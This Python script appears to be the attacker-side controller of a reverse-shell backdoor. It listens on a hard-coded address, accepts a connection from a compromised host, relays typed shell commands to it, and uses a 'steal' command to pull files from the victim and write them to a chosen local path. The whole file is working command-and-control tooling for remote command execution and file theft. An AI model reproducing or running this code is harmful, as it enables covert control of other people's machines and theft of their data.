from socket import *

PWD = input("Where do you want to save your files stealed? \nExample: /home/nonameon/Desktop/file\nPath: ")

def connect():
    # TCP connection
    sock = socket(AF_INET, SOCK_STREAM)
    host = "192.168.1.8"
    port = 11
    buffer_size = 1024
    sock.bind((host, port))
    sock.listen(1)

    while 1:
        print("[+] Listening {}:{}".format(host, port), end="")
        client, addr = sock.accept()
        print("\n[+] Connection from: ", addr)
        print("[?] Use 'steal><fila path>' for get file or 'terminate' for close connection")
        while 1:
            command = input("Shell> ")

            if "terminate" in command:
                client.send("terminate".encode())
                client.close()
                print("[+] Closed!")
                print("[+] Listening {}:{}".format(host, port), end="")
                break
            else:
                #manda
                client.send(command.encode())
                #riceve
                resp = client.recv(buffer_size)
                flag = True
                if "steal" in command:
                    file_backdoor = PWD
                    print("[+] Start!")
                    with open(file_backdoor, "wb") as f:
                        while True:
                            f.write(resp)
                            resp = client.recv(buffer_size)
                            if "end-transfer-file" in resp.decode("ISO-8859-1"):
                                break
                    print("[+] End!")
                else:
                    print(resp.decode("ISO-8859-1"))

def main():
    connect()
main()
